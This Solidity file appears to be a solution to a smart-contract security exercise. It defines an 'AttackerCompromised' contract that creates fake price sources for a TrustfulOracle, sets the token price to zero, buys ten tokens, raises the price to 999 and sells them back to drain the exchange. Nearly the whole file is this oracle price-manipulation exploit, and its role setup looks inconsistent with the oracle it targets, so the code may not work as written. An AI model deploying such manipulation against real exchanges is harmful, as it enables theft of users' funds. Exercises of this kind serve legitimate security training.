// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControlEnumerable.sol";
import "./TrustfulOracle.sol";
import "./Source.sol";
import "./Exchange.sol";


contract AttackerCompromised is AccessControlEnumerable {

    bytes32 public constant TRUSTED_SOURCE_ROLE = keccak256("TRUSTED_SOURCE_ROLE");
    TrustfulOracle public oracle;
    Source[4] public sources;
    Exchange public exchange;
    uint[10] public tokensId;

    constructor(address _oracleAddress, address payable _exchangeAddress) {
        oracle = TrustfulOracle(_oracleAddress);
        exchange = Exchange(_exchangeAddress);
    }

    function createSources() external payable {
        for (uint8 i = 0; i < 4; i++) {
            Source source = new Source(address(oracle));
            //source.registrate(address(source));
            _setupRole(TRUSTED_SOURCE_ROLE, address(source));
            source.setPrice(0);
            sources[i] = source;
        }  
    }

    // function set0Price() public {

    // }

    function buy() public {
        for (uint8 i = 0; i < 10; i++) {
            tokensId[i] = exchange.buyOne();
        }
    }

    function putBackPrice() public {
        for (uint8 i = 0; i < 4; i++) {
            sources[i].setPrice(999);
        }
    }

    function sell() public {
        for (uint8 i = 0; i < 10; i++) {
            exchange.sellOne(tokensId[i]);
        }
    }

    receive() payable external {}
}